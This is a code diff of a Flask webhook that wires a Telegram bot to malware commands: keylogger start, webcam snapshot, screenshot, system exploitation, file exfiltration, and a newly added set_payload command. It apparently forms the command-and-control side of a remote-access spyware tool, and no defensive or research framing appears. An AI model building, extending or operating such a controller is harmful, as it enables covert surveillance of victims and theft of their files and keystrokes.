@@ -7,15 +7,15 @@ from flask import Blueprint, request, Response
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler
 
-# ✅ Import clés depuis utils
+# 🔐 Import des clés
 from modules.utils import get_api_keys
 
-# ✅ Commandes Telegram importées du module
+# 📦 Import des commandes Telegram
 from telegram_bot.telegram_bot import (
     menu, osint, scan, exploit_sys,
     screenshot, keylogger_start,
     webcam_snap, exfiltrate, exfiltrate_path,
-    rapport
+    rapport, set_payload  # N'oublie pas cette commande si active
 )
 
 # 🔐 Chargement des clés
@@ -23,13 +23,13 @@ api = get_api_keys()
 TOKEN = api.get("TELEGRAM_BOT_TOKEN")
 SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")
 
-# ✅ Définition du webhook Flask
+# 📡 Blueprint Flask pour Telegram Webhook
 telegram_webhook = Blueprint("telegram_webhook", __name__)
 
 @telegram_webhook.route("/telegram/webhook", methods=["POST"])
 def handle_webhook():
     try:
-        # 🔐 Vérification du secret Telegram
+        # 🔐 Sécurité du webhook
         if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != SECRET_TOKEN:
             print("❌ Requête rejetée : mauvais token secret.")
             return Response("Unauthorized", status=403)
@@ -37,10 +37,10 @@ def handle_webhook():
         update_data = request.get_json(force=True)
         update = Update.de_json(update_data, bot=None)
 
-        # 🔁 Nouvelle instance Application (anti boucle fermée)
+        # ✅ Nouvelle instance Application
         app = ApplicationBuilder().token(TOKEN).build()
 
-        # ➕ Enregistrement des commandes supportées
+        # ➕ Enregistrement des handlers
         app.add_handler(CommandHandler("menu", menu))
         app.add_handler(CommandHandler("osint", osint))
         app.add_handler(CommandHandler("scan", scan))
@@ -51,13 +51,14 @@ def handle_webhook():
         app.add_handler(CommandHandler("exfiltrate", exfiltrate))
         app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
         app.add_handler(CommandHandler("rapport", rapport))
+        app.add_handler(CommandHandler("set_payload", set_payload))  # Si actif
 
-        # 🧠 Traitement asynchrone
+        # 🧠 Fonction asynchrone isolée
         async def process():
             await app.initialize()
             await app.process_update(update)
 
-        # 🎯 Event loop propre pour Render
+        # 🎯 Création et fermeture propre de la boucle asyncio
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         loop.run_until_complete(process())
